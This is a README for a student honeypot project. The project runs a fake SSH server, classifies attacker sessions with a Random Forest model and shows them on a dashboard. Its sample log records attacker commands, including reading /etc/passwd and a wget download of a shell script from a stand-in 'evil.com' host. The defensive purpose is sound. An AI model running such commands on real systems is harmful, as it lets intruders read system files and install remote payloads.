# 🍯 AI-Based Real-Time Honeypot System
### MCA Final Year Project

> **Cyber Attack Detection with Machine Learning & Interactive Dashboard**

---

## 📌 Project Overview

This system simulates an SSH honeypot to lure attackers, captures their activity, processes the logs using Python, trains a Random Forest ML model to classify threats, and visualizes everything on a real-time Streamlit dashboard.

```
Attacker ──► SSH Honeypot (port 2222)
                    │
                    ▼
            honeypot_logs.json
                    │
                    ▼
         process_logs.py (Feature Extraction)
                    │
                    ▼
           processed_logs.csv
                    │
                    ▼
         train_model.py (Random Forest)
                    │
                    ▼
      rf_model.pkl + label_encoder.pkl
                    │
                    ▼
     Streamlit Dashboard (dashboard/app.py)
```

---

## 📁 Project Structure

```
honeypot_project/
│
├── honeypot/
│   ├── ssh_honeypot.py        ← SSH server (paramiko-based fake SSH)
│   └── attack_simulator.py    ← Safe local attack simulator
│
├── data/
│   ├── honeypot_logs.json     ← Raw captured logs (auto-created)
│   └── processed_logs.csv     ← Feature-extracted dataset
│
├── src/
│   ├── generate_sample_data.py ← Demo data generator
│   ├── process_logs.py         ← JSON → CSV feature extractor
│   ├── train_model.py          ← Random Forest training
│   └── predict.py              ← CLI predictor
│
├── models/
│   ├── rf_model.pkl            ← Trained model (auto-created)
│   ├── label_encoder.pkl       ← Label encoder
│   └── metrics.json            ← Model performance metrics
│
├── dashboard/
│   └── app.py                  ← Streamlit interactive dashboard
│
├── app.py                      ← Master launcher
├── requirements.txt
└── README.md
```

---

## ⚙️ Setup Instructions

### Step 1 — Prerequisites

```bash
# Linux / Ubuntu / Kali recommended
# Python 3.9+ required

python3 --version  # should be 3.9+
```

### Step 2 — Create Virtual Environment

```bash
cd honeypot_project
python3 -m venv venv
source venv/bin/activate
```

### Step 3 — Install Dependencies

```bash
pip install -r requirements.txt
```

---

## 🚀 Running the Project

### Option A — Quick Demo (No Honeypot Needed)

Perfect for testing the dashboard and ML model immediately:

```bash
# 1. Generate demo data
python app.py sample

# 2. Train the model
python app.py train

# 3. Launch the dashboard
python app.py dashboard
```

Open browser: **http://localhost:8501**

---

### Option B — Full Live Honeypot Mode

#### Terminal 1 — Start the Honeypot

```bash
python app.py honeypot
# OR
python honeypot/ssh_honeypot.py
```

Output:
```
╔══════════════════════════════════════════════╗
║      SSH HONEYPOT — LISTENING ON PORT 2222   ║
╚══════════════════════════════════════════════╝
```

#### Terminal 2 — Simulate Attacks

```bash
python app.py simulate
# OR
python honeypot/attack_simulator.py all
```

Attack modes:
```bash
python honeypot/attack_simulator.py brute     # Brute-force only
python honeypot/attack_simulator.py targeted  # Targeted attack
python honeypot/attack_simulator.py scan      # Port scan simulation
```

You can also manually connect:
```bash
ssh localhost -p 2222   # try password: root, admin, 123456
```

#### Terminal 3 — Process Logs

```bash
python app.py process
```

#### Terminal 4 — Train ML Model

```bash
python app.py train
```

#### Terminal 5 — Launch Dashboard

```bash
python app.py dashboard
```

---

## 🤖 Machine Learning Details

### Algorithm: Random Forest Classifier

| Feature | Description |
|---------|-------------|
| `login_attempts` | Number of password tries |
| `command_count` | Commands executed in session |
| `session_duration` | Seconds the session lasted |
| `has_malicious_cmd` | 0/1 — did they run wget/curl/chmod etc. |

### Labels

| Label | Criteria |
|-------|----------|
| **Normal** | 1 attempt, no commands, short session (background scanner) |
| **Suspicious** | 2–4 attempts OR commands run (probing attacker) |
| **Malicious** | 5+ attempts AND malicious commands (active intruder) |

### Expected Performance

```
Accuracy: ~95%+ on balanced dataset
Precision/Recall: ~0.93+ across all classes
CV Score (5-fold): ~0.94 ± 0.02
```

---

## 📊 Dashboard Features

| Feature | Description |
|---------|-------------|
| 🔄 Auto-refresh | Updates every 10 seconds |
| 🌐 IP filter | Filter logs by specific attacker IP |
| 🎯 Attack type filter | Show only Malicious/Suspicious/Normal |
| 📅 Time range | Last 1h / 6h / 24h / 7d / All time |
| 📊 Bar chart | Attack frequency per IP (stacked by type) |
| 🥧 Pie chart | Overall attack category distribution |
| ⏱ Timeline | Area chart of attacks over time |
| 🔬 Scatter plot | Session duration vs login attempts |
| 📋 Log table | Searchable, colour-coded session table |
| 💾 CSV export | Download filtered logs |
| 🤖 Model panel | Accuracy, CV score, feature importance |

---

## 🔒 Security Notes

- The honeypot intentionally accepts login on the **3rd attempt** to lure attackers into an interactive shell
- All attack simulations target **127.0.0.1 only** — never external IPs
- The honeypot does **not** execute any commands — all responses are faked
- Run in a VM or isolated environment for maximum safety

---

## 🎓 Viva Explanation

**Q: What is a honeypot?**
> A honeypot is a decoy system that mimics a real SSH server to attract attackers. It captures their IPs, usernames, passwords, and commands without exposing real systems.

**Q: Why Random Forest?**
> Random Forest is an ensemble method combining 100 decision trees. It handles imbalanced classes well, is robust to noise, provides feature importance, and achieves >95% accuracy on this problem.

**Q: How does the ML model classify threats?**
> We extract 4 features per session: login attempts, command count, session duration, and whether malicious commands were used. The model was trained on labelled data using heuristic rules and classifies each new session into Normal, Suspicious, or Malicious.

**Q: What makes this real-time?**
> The dashboard auto-refreshes every 10 seconds, re-reading the latest logs from disk. The honeypot appends to the JSON log file in real time as attacks happen.

**Q: What is the attack flow?**
> Attacker connects → honeypot captures credentials → logs written to JSON → process_logs.py extracts features → ML model classifies → dashboard displays alerts.

---

## 📦 Sample Output

### Honeypot Log (data/honeypot_logs.json)
```json
{
  "timestamp": "2024-01-15T10:23:41",
  "ip": "192.168.1.55",
  "event": "session",
  "username": "root",
  "password": "toor",
  "login_attempts": 3,
  "commands": ["whoami", "cat /etc/passwd", "wget http://evil.com/shell.sh"],
  "command_count": 3,
  "session_duration": 45.2
}
```

### ML Training Output
```
  Test Accuracy    : 0.9620 (96.2%)
  CV Accuracy (5-fold): 0.9480 ± 0.0180

  Feature Importances:
    login_attempts        : 0.3812  ███████████████
    has_malicious_cmd     : 0.2956  ████████████
    command_count         : 0.1934  ████████
    session_duration      : 0.1298  █████
```

---

*Built with Python • Paramiko • scikit-learn • Streamlit • Plotly*
